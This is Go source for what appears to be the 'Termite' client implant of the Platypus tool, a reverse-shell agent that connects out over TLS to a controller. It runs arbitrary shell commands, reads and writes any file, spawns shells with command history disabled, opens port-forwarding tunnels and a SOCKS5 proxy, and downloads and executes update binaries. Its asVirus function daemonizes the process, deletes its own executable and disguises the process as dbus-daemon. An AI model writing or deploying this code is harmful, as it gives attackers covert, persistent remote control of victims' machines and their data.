package main

import (
	"crypto/tls"
	"crypto/x509"
	"encoding/gob"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/WangYihang/Platypus/internal/util/config"
	"github.com/WangYihang/Platypus/internal/util/crypto"
	"github.com/WangYihang/Platypus/internal/util/hash"
	"github.com/WangYihang/Platypus/internal/util/log"
	"github.com/WangYihang/Platypus/internal/util/message"
	"github.com/WangYihang/Platypus/internal/util/network"
	"github.com/WangYihang/Platypus/internal/util/str"
	"github.com/WangYihang/Platypus/internal/util/update"
	"github.com/armon/go-socks5"
	"github.com/creack/pty"
	"github.com/erikdubbelboer/gspt"
	"github.com/phayes/freeport"
	"github.com/rhysd/go-github-selfupdate/selfupdate"
	"github.com/sevlyar/go-daemon"
)

type backOff struct {
	Current int64
	Unit    time.Duration
	Max     int64
}

func (b *backOff) Reset() {
	b.Current = 1
}

func (b *backOff) increase() {
	b.Current <<= 1
	if b.Current > b.Max {
		b.Reset()
	}
}

func (b *backOff) Sleep(add int64) {
	var i int64 = 0
	for i < b.Current+add {
		time.Sleep(b.Unit)
		i++
	}
	b.increase()
}

func createBackOff() *backOff {
	backoff := &backOff{
		Unit: time.Second,
		Max:  0x100,
	}
	backoff.Reset()
	return backoff
}

var backoff *backOff

type termiteProcess struct {
	ptmx       *os.File
	windowSize *pty.Winsize
	process    *exec.Cmd
}

var processes map[string]*termiteProcess
var pullTunnels map[string]*net.Conn
var pushTunnels map[string]*net.Conn
var socks5ServerListener *net.Listener

type client struct {
	conn         *tls.Conn
	encoder      *gob.Encoder
	decoder      *gob.Decoder
	encoderLock  *sync.Mutex
	decoderLock  *sync.Mutex
	platypusHost string
	platypusPort uint16
}

func (c *client) LockEncoder() {
	c.encoderLock.Lock()
}

func (c *client) UnlockEncoder() {
	c.encoderLock.Unlock()
}

func (c *client) LockDecoder() {
	c.decoderLock.Lock()
}

func (c *client) UnlockDecoder() {
	c.decoderLock.Unlock()
}

func (c *client) Send(msg message.Message) error {
	c.LockEncoder()
	err := c.encoder.Encode(msg)
	c.UnlockEncoder()
	return err
}

func (c *client) Recv(msg *message.Message) error {
	c.LockDecoder()
	err := c.decoder.Decode(msg)
	c.UnlockDecoder()
	return err
}

func handleConnection(c *client) {
	oldbackOffCurrent := backoff.Current

	for {
		msg := &message.Message{}
		err := c.Recv(msg)
		if err != nil {
			// Network
			log.Error("Network error: %s", err)
			break
		}
		backoff.Reset()
		switch msg.Type {
		case message.STDIO:
			if termiteProcess, exists := processes[msg.Body.(*message.BodyStdio).Key]; exists {
				termiteProcess.ptmx.Write(msg.Body.(*message.BodyStdio).Data)
			}
		case message.WINDOW_SIZE:
			serverWindowSize := &pty.Winsize{
				Cols: uint16(msg.Body.(*message.BodyWindowSize).Columns),
				Rows: uint16(msg.Body.(*message.BodyWindowSize).Rows),
				X:    0,
				Y:    0,
			}
			// Change pty window size
			if termiteProcess, exists := processes[msg.Body.(*message.BodyWindowSize).Key]; exists {
				pty.Setsize(termiteProcess.ptmx, serverWindowSize)
			}
		case message.PROCESS_START:
			bodyStartProcess := msg.Body.(*message.BodyStartProcess)
			if bodyStartProcess.Path == "" {
				continue
			}
			log.Success("Starting process: %s", bodyStartProcess.Path)
			process := exec.Command(bodyStartProcess.Path)

			// Disable command history
			process.Env = os.Environ()
			process.Env = append(process.Env, "HISTORY=")
			process.Env = append(process.Env, "HISTSIZE=0")
			process.Env = append(process.Env, "HISTSAVE=")
			process.Env = append(process.Env, "HISTZONE=")
			process.Env = append(process.Env, "HISTLOG=")
			process.Env = append(process.Env, "HISTFILE=")
			process.Env = append(process.Env, "HISTFILE=/dev/null")
			process.Env = append(process.Env, "HISTFILESIZE=0")

			windowSize := pty.Winsize{
				Rows: uint16(bodyStartProcess.WindowRows),
				Cols: uint16(bodyStartProcess.WindowColumns),
				X:    0,
				Y:    0,
			}
			ptmx, _ := pty.StartWithSize(process, &windowSize)
			processes[bodyStartProcess.Key] = &termiteProcess{
				windowSize: &windowSize,
				ptmx:       ptmx,
				process:    process,
			}
			log.Success("Process started: %d", process.Process.Pid)
			log.Success("Process added: %v", processes)
			defer func() { _ = ptmx.Close() }()

			err = c.Send(message.Message{
				Type: message.PROCESS_STARTED,
				Body: message.BodyProcessStarted{
					Key: bodyStartProcess.Key,
					Pid: process.Process.Pid,
				},
			})
			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				break
			}

			go func() {
				for {
					buffer := make([]byte, 0x4000)
					n, err := ptmx.Read(buffer)
					if err != nil {
						if err == io.EOF {
							err = c.Send(message.Message{
								Type: message.PROCESS_STOPED,
								Body: message.BodyProcessStoped{
									Key:  bodyStartProcess.Key,
									Code: 0,
								},
							})
							if err != nil {
								// Network
								log.Error("Process stop: %s", err.Error())
								break
							}
							break
						}
						break
					}
					if n > 0 {
						err = c.Send(message.Message{
							Type: message.STDIO,
							Body: message.BodyStdio{
								Key:  bodyStartProcess.Key,
								Data: buffer[0:n],
							},
						})
						if err != nil {
							// Network
							log.Error("Network error: %s", err)
							break
						}
					}
				}
			}()

			// Wait process exit
			go func() {
				err := process.Wait()

				exitCode := 0
				if err != nil {
					exitCode = err.(*exec.ExitError).ExitCode()
				}
				fmt.Println("Exit code: ", exitCode)

				err = c.Send(message.Message{
					Type: message.PROCESS_STOPED,
					Body: message.BodyProcessStoped{
						Key:  bodyStartProcess.Key,
						Code: exitCode,
					},
				})

				if err != nil {
					// Network
					log.Error("Network error: %s", err)
				}

				delete(processes, bodyStartProcess.Key)
			}()
		case message.PROCESS_STARTED:
		case message.PROCESS_STOPED:
		case message.GET_CLIENT_INFO:
			// User Information
			userInfo, err := user.Current()
			var username string
			if err != nil {
				username = "Unknown"
			} else {
				username = userInfo.Username
			}
			// Python
			python2, err := exec.LookPath("python2")
			if err != nil {
				python2 = ""
			}

			python3, err := exec.LookPath("python3")
			if err != nil {
				python3 = ""
			}

			// Network interfaces
			interfaces := map[string]string{}
			ifaces, _ := net.Interfaces()
			for _, i := range ifaces {
				interfaces[i.Name] = i.HardwareAddr.String()
			}

			err = c.Send(message.Message{
				Type: message.CLIENT_INFO,
				Body: message.BodyClientInfo{
					Version:           update.Version,
					User:              username,
					OS:                runtime.GOOS,
					Arch:              runtime.GOARCH,
					Python2:           python2,
					Python3:           python3,
					NetworkInterfaces: interfaces,
					PlatypusHost:      c.platypusHost,
				},
			})

			if err != nil {
				// Network
				log.Error("Network error: %s", err)
				return
			}
		case message.DUPLICATED_CLIENT:
			backoff.Current = oldbackOffCurrent
			log.Error("Duplicated connection")
			os.Exit(0)
		case message.PROCESS_TERMINATE:
			key := msg.Body.(*message.BodyTerminateProcess).Key
			log.Success("Request terminate %s", key)
			if termiteProcess, exists := processes[key]; exists {
				syscall.Kill(termiteProcess.process.Process.Pid, syscall.SIGTERM)
				termiteProcess.ptmx.Close()
			}
		case message.PULL_TUNNEL_CONNECT:
			address := msg.Body.(*message.BodyPullTunnelConnect).Address
			token := msg.Body.(*message.BodyPullTunnelConnect).Token

			conn, err := net.Dial("tcp", address)
			if err != nil {
				log.Error(err.Error())
				c.Send(message.Message{
					Type: message.PULL_TUNNEL_CONNECT_FAILED,
					Body: message.BodyPullTunnelConnectFailed{
						Token:  token,
						Reason: err.Error(),
					},
				})
			} else {
				err := c.Send(message.Message{
					Type: message.PULL_TUNNEL_CONNECTED,
					Body: message.BodyPullTunnelConnected{
						Token: token,
					},
				})

				if err != nil {
					log.Error(err.Error())
				} else {
					pullTunnels[token] = &conn
					go func() {
						for {
							buffer := make([]byte, 0x100)
							n, err := conn.Read(buffer)
							if err != nil {
								log.Success("Tunnel (%s) disconnected: %s", token, err.Error())
								c.Send(message.Message{
									Type: message.PULL_TUNNEL_DISCONNECTED,
									Body: message.BodyPullTunnelDisconnected{
										Token: token,
									},
								})
								conn.Close()
								break
							}
							if n > 0 {
								c.Send(message.Message{
									Type: message.PULL_TUNNEL_DATA,
									Body: message.BodyPullTunnelData{
										Token: token,
										Data:  buffer[0:n],
									},
								})
							}
						}
					}()
				}
			}
		case message.PULL_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPullTunnelData).Token
			data := msg.Body.(*message.BodyPullTunnelData).Data
			if conn, exists := pullTunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
				}
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PULL_TUNNEL_DISCONNECT:
			token := msg.Body.(*message.BodyPullTunnelDisconnect).Token
			if conn, exists := pullTunnels[token]; exists {
				log.Info("Closing conntion: %s", (*conn).RemoteAddr().String())
				(*conn).Close()
				delete(pullTunnels, token)
				c.Send(message.Message{
					Type: message.PULL_TUNNEL_DISCONNECTED,
					Body: message.BodyPullTunnelDisconnected{
						Token: token,
					},
				})
			} else {
				log.Debug("No such tunnel: %s", token)
			}
		case message.PUSH_TUNNEL_CREATE:
			address := msg.Body.(*message.BodyPushTunnelCreate).Address
			log.Info("Creating remote port forwarding from %s", address)
			server, err := net.Listen("tcp", address)
			if err != nil {
				log.Error("Server (%s) create failed: %s", address, err.Error())
				c.Send(message.Message{
					Type: message.PUSH_TUNNEL_CREATE_FAILED,
					Body: message.BodyPushTunnelCreateFailed{
						Address: address,
						Reason:  err.Error(),
					},
				})
			} else {
				log.Success("Server created (%s)", address)
				c.Send(message.Message{
					Type: message.PUSH_TUNNEL_CREATED,
					Body: message.BodyPushTunnelCreated{
						Address: address,
					},
				})

				go func() {
					for {
						conn, err := server.Accept()
						token := str.RandomString(0x10)
						log.Success("Connection came from: %s", conn.RemoteAddr().String())
						if err == nil {
							c.Send(message.Message{
								Type: message.PUSH_TUNNEL_CONNECT,
								Body: message.BodyPushTunnelConnect{
									Token:   token,
									Address: address,
								},
							})
							pushTunnels[token] = &conn
						}
					}
				}()
			}
		case message.PUSH_TUNNEL_CONNECTED:
			token := msg.Body.(*message.BodyPushTunnelConnected).Token
			log.Success("Connection (%s) connected", token)
			if conn, exists := pushTunnels[token]; exists {
				go func() {
					for {
						buffer := make([]byte, 0x4000)
						n, err := (*conn).Read(buffer)
						if err != nil {
							log.Error("Read from (%s) failed: %s", token, err.Error())
							c.Send(message.Message{
								Type: message.PUSH_TUNNEL_DISCONNECTED,
								Body: message.BodyPushTunnelDisonnected{
									Token:  token,
									Reason: err.Error(),
								},
							})
							(*conn).Close()
							delete(pushTunnels, token)
							break
						} else {
							log.Debug("%d bytes read from (%s)", n, token)
							c.Send(message.Message{
								Type: message.PUSH_TUNNEL_DATA,
								Body: message.BodyPushTunnelData{
									Token: token,
									Data:  buffer[0:n],
								},
							})
						}
					}
				}()
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECTED): %s", token)
			}
		case message.PUSH_TUNNEL_DISCONNECTED:
			token := msg.Body.(*message.BodyPushTunnelDisonnected).Token
			if conn, exists := pushTunnels[token]; exists {
				(*conn).Close()
				delete(pushTunnels, token)
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_DISCONNECTED): %s", token)
			}
		case message.PUSH_TUNNEL_CONNECT_FAILED:
			token := msg.Body.(*message.BodyPushTunnelConnectFailed).Token
			if conn, exists := pushTunnels[token]; exists {
				(*conn).Close()
				delete(pushTunnels, token)
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_CONNECT_FAILED): %s", token)
			}
		case message.PUSH_TUNNEL_DATA:
			token := msg.Body.(*message.BodyPushTunnelData).Token
			data := msg.Body.(*message.BodyPushTunnelData).Data
			if conn, exists := pushTunnels[token]; exists {
				_, err := (*conn).Write(data)
				if err != nil {
					(*conn).Close()
					delete(pushTunnels, token)
				}
			} else {
				log.Debug("No such tunnel (PUSH_TUNNEL_DATA): %s", token)
			}
		case message.DYNAMIC_TUNNEL_CREATE:
			port, err := startSocks5Server()
			if err != nil {
				c.Send(message.Message{
					Type: message.DYNAMIC_TUNNEL_CREATE_FAILED,
					Body: message.BodyDynamicTunnelCreateFailed{
						Reason: err.Error(),
					},
				})
			} else {
				c.Send(message.Message{
					Type: message.DYNAMIC_TUNNEL_CREATED,
					Body: message.BodyDynamicTunnelCreated{
						Port: port,
					},
				})
			}
		case message.DYNAMIC_TUNNEL_DESTROY:
			err := stopSocks5Server()
			if err != nil {
				log.Error("stopSocks5Server() failed: %s", err.Error())
				c.Send(message.Message{
					Type: message.DYNAMIC_TUNNEL_DESTROY_FAILED,
					Body: message.BodyDynamicTunnelDestroyFailed{
						Reason: err.Error(),
					},
				})
			} else {
				c.Send(message.Message{
					Type: message.DYNAMIC_TUNNEL_DESTROIED,
					Body: message.BodyDynamicTunnelDestroied{},
				})
				socks5ServerListener = nil
			}
		case message.CALL_SYSTEM:
			token := msg.Body.(*message.BodyCallSystem).Token
			command := msg.Body.(*message.BodyCallSystem).Command
			result, err := exec.Command("sh", "-c", command).Output()
			if err != nil {
				result = []byte("")
			}
			c.Send(message.Message{
				Type: message.CALL_SYSTEM_RESULT,
				Body: message.BodyCallSystemResult{
					Token:  token,
					Result: result,
				},
			})
		case message.READ_FILE:
			token := msg.Body.(*message.BodyReadFile).Token
			path := msg.Body.(*message.BodyReadFile).Path
			content, err := ioutil.ReadFile(path)
			if err != nil {
				content = []byte("")
			}
			c.Send(message.Message{
				Type: message.READ_FILE_RESULT,
				Body: message.BodyReadFileResult{
					Token:  token,
					Result: content,
				},
			})
		case message.READ_FILE_EX:
			token := msg.Body.(*message.BodyReadFileEx).Token
			path := msg.Body.(*message.BodyReadFileEx).Path
			start := msg.Body.(*message.BodyReadFileEx).Start
			size := msg.Body.(*message.BodyReadFileEx).Size

			f, err := os.OpenFile(path, os.O_RDONLY|os.O_CREATE, 0644)
			if err != nil {
				log.Info(err.Error())
			}
			buffer := make([]byte, size)
			n, err := f.ReadAt(buffer, start)
			if err != nil {
				log.Info(err.Error())
			}
			log.Info("Reading %d/%d bytes from file %s offset %d", n, size, path, start)
			f.Close()

			c.Send(message.Message{
				Type: message.READ_FILE_EX_RESULT,
				Body: message.BodyReadFileExResult{
					Token:  token,
					Result: buffer[0:n],
				},
			})
		case message.FILE_SIZE:
			token := msg.Body.(*message.BodyFileSize).Token
			path := msg.Body.(*message.BodyFileSize).Path

			fi, err := os.Stat(path)
			var n int64
			if err != nil {
				log.Error(err.Error())
				n = -1
			} else {
				n = fi.Size()
			}

			c.Send(message.Message{
				Type: message.FILE_SIZE_RESULT,
				Body: message.BodyFileSizeResult{
					Token: token,
					N:     n,
				},
			})
		case message.WRITE_FILE:
			token := msg.Body.(*message.BodyWriteFile).Token
			path := msg.Body.(*message.BodyWriteFile).Path
			content := msg.Body.(*message.BodyWriteFile).Content

			f, _ := os.OpenFile(path, os.O_WRONLY|os.O_CREATE, 0644)
			n, err := f.Write(content)
			if err != nil {
				n = -1
			}
			f.Close()

			c.Send(message.Message{
				Type: message.WRITE_FILE_RESULT,
				Body: message.BodyWriteFileResult{
					Token: token,
					N:     n,
				},
			})
		case message.WRITE_FILE_EX:
			token := msg.Body.(*message.BodyWriteFileEx).Token
			path := msg.Body.(*message.BodyWriteFileEx).Path
			content := msg.Body.(*message.BodyWriteFileEx).Content

			f, _ := os.OpenFile(path, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
			n, err := f.Write(content)
			if err != nil {
				log.Error(err.Error())
				n = -1
			}
			f.Close()

			c.Send(message.Message{
				Type: message.WRITE_FILE_EX_RESULT,
				Body: message.BodyWriteFileExResult{
					Token: token,
					N:     n,
				},
			})
		case message.UPDATE:
			file, _ := ioutil.TempFile(os.TempDir(), "temp")
			exe := file.Name()
			token := msg.Body.(*message.BodyUpdate).Token
			distributorPort := msg.Body.(*message.BodyUpdate).DistributorPort
			version := msg.Body.(*message.BodyUpdate).Version
			// Construct new binary download url
			url := fmt.Sprintf("http://%s:%d/%s", c.platypusHost, distributorPort, token)
			log.Info("Upgrading from v%s to v%s", update.Version, version)
			log.Info("Downloading %s into %s", url, exe)
			if err := selfupdate.UpdateTo(url, exe); err != nil {
				log.Error("Error occurred while updating binary: %s", err)
				return
			}
			log.Info("Restarting...")
			syscall.Exec(exe, []string{exe}, nil)
		}
	}
}

func startSocks5Server() (int, error) {
	// Generate random port
	port, err := freeport.GetFreePort()
	if err != nil {
		return -1, err
	}
	log.Success("Port: %d", port)
	addr := fmt.Sprintf("127.0.0.1:%d", port)
	// Create tcp listener
	socks5ServerListener, err := net.Listen("tcp", addr)
	if err != nil {
		return -1, err
	}
	// Create socks5 server
	server, err := socks5.New(&socks5.Config{})
	if err != nil {
		return -1, err
	}
	// Start socks5 server
	go server.Serve(socks5ServerListener)
	log.Success("Socks server started at: %s", addr)
	return port, nil
}

func stopSocks5Server() error {
	return (*socks5ServerListener).Close()
}

func startClient(platypusAddr string) bool {
	needRetry := true
	certBuilder := new(strings.Builder)
	keyBuilder := new(strings.Builder)
	crypto.Generate(certBuilder, keyBuilder)

	pemContent := []byte(fmt.Sprint(certBuilder))
	keyContent := []byte(fmt.Sprint(keyBuilder))

	cert, err := tls.X509KeyPair(pemContent, keyContent)
	if err != nil {
		log.Error("server: loadkeys: %s", err)
		return needRetry
	}

	config := tls.Config{Certificates: []tls.Certificate{cert}, InsecureSkipVerify: true}
	// It means that the platypus address changed when the hash dismatched
	// md5("AAAA....DDDD:65535") == "09224e9df91cd6f9e0117d185556528a"
	if hash.MD5(platypusAddr) != "09224e9df91cd6f9e0117d185556528a" {
		log.Debug("Connecting to: %s", platypusAddr)
		conn, err := tls.Dial("tcp", platypusAddr, &config)
		if err != nil {
			log.Error("client: dial: %s", err)
			return needRetry
		}
		defer conn.Close()

		state := conn.ConnectionState()
		for _, v := range state.PeerCertificates {
			x509.MarshalPKIXPublicKey(v.PublicKey)
		}

		log.Success("Secure connection established on %s", conn.RemoteAddr())

		pHost, pPort, err := network.ParseHostPort(platypusAddr)
		if err != nil {
			return !needRetry
		}

		c := &client{
			conn:         conn,
			encoder:      gob.NewEncoder(conn),
			decoder:      gob.NewDecoder(conn),
			encoderLock:  &sync.Mutex{},
			decoderLock:  &sync.Mutex{},
			platypusHost: pHost,
			platypusPort: pPort,
		}
		handleConnection(c)
		return needRetry
	}
	return !needRetry
}

func removeSelfExecutable() {
	filename, _ := filepath.Abs(os.Args[0])
	os.Remove(filename)
}

func asVirus() {
	cntxt := &daemon.Context{
		WorkDir: "/",
		Umask:   027,
		Args:    []string{},
	}
	d, err := cntxt.Reborn()
	if err != nil {
		log.Error("Unable to run: %s", err.Error())
	}
	if d != nil {
		os.Exit(0)
		return
	}
	defer cntxt.Release()
	log.Success("daemon started")
	removeSelfExecutable()
	gspt.SetProcTitle("/usr/bin/dbus-daemon --session --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only")
}

func main() {
	release := false
	platypusAddr := "127.0.0.1:13337"
	/*
		Each element of a domain name separated by [.] is called a “label.”
		The maximum length of each label is 63 characters, and a full domain
		name can have a maximum of 253 characters.
	*/
	// Remote address string placeholder
	if release {
		platypusAddr = strings.Trim(config.RemoteAddrPlaceHolder, " ")
		asVirus()
	}

	message.RegisterGob()
	backoff = createBackOff()
	processes = map[string]*termiteProcess{}
	pullTunnels = map[string]*net.Conn{}
	pushTunnels = map[string]*net.Conn{}

	for {
		log.Info("Termite (v%s) starting...", update.Version)
		if startClient(platypusAddr) {
			add := (int64(rand.Uint64()) % backoff.Current)
			log.Error("Connect to server failed, sleeping for %d seconds", backoff.Current+add)
			backoff.Sleep(add)
		} else {
			break
		}
	}
}
